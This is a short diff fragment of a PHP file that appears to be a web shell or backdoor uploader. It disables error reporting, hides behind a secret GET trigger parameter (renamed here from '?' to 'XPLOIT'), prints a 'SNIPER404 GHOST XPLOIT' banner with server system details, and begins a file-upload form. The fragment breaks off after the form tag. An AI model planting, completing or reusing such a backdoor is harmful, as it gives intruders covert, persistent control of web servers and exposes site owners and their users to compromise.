@@ -2,7 +2,7 @@
 set_time_limit(0);
 error_reporting(0);
 error_log(0);
-if(isset($_GET["?"])){
+if(isset($_GET["XPLOIT"])){
 echo "<center>
 <h4>✘✘✘ 𝚂𝙽𝙸𝙿𝙴𝚁𝟺𝟶𝟺 𝙶𝙷𝙾𝚂𝚃 𝚇𝙿𝙻𝙾𝙸𝚃 ✘✘✘</h4><br><b>".php_uname()."</b><br><br>";
 echo "<form method='post' enctype='multipart/form-data'>
